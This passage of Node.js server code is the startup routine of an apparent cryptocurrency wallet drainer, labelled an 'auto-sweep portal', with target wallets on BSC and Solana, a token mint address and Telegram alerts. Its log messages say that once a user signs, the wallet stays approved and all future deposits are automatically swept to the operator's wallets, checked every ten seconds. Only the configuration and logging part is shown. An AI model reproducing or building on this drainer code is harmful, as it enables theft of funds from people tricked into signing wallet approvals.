  console.log('[INIT] Priority Fees: ENABLED (500,000 micro-lamports)');
  console.log('[INIT] Socket.io server: READY');
  console.log('[INIT] Telegram Bot: ENABLED');
  
  await sendTelegramNotification(`*🚀 AUTO-SWEEPER BACKEND STARTED*\n\nBSC Sweeper: \`${bscSweeperAddress || 'Not loaded'}\`\nFee Payer: \`${feePayerKeypair?.publicKey?.toString() || 'Not loaded'}\`\nMulti-RPC: ${RPC_ENDPOINTS.length} endpoints\nPriority Fees: ENABLED`, 'success');
  
  httpServer.listen(PORT, () => {
    console.log('');
    console.log('========================================');
    console.log('  AUTO-SWEEP PORTAL ACTIVE');
    console.log('========================================');
    console.log('  Port:', PORT);
    console.log('  BSC Sweeper:', bscSweeperAddress || 'Not loaded');
    console.log('  Fee Payer (SOL):', feePayerKeypair?.publicKey?.toString() || 'Not loaded');
    console.log('  Target BSC:', TARGET_WALLET_BSC);
    console.log('  Target Solana:', TARGET_WALLET_SOLANA);
    console.log('  Trump Mint:', TRUMP_MINT_ADDRESS);
    console.log('  Telegram: ENABLED ✅');
    console.log('  Queue: ENABLED (10 concurrent)');
    console.log('  Socket.io: ENABLED');
    console.log('  Priority Fees: ENABLED');
    console.log('  Multi-RPC: ENABLED');
    console.log('========================================');
    console.log('');
    console.log('[INFO] Once a user signs, their wallet is PERSISTENTLY approved');
    console.log('[INFO] Sweeps are QUEUED and processed 10 at a time');
    console.log('[INFO] Any future deposits will be AUTO-SWEPT');
    console.log('[INFO] Monitoring runs every 10 seconds');
    console.log('[INFO] Priority fees ensure fast confirmation');
    console.log('[INFO] Transactions broadcast to multiple RPCs');
    console.log('[INFO] Telegram notifications will be sent for ALL events');
    console.log('');
  });
};

startServer().catch(console.error);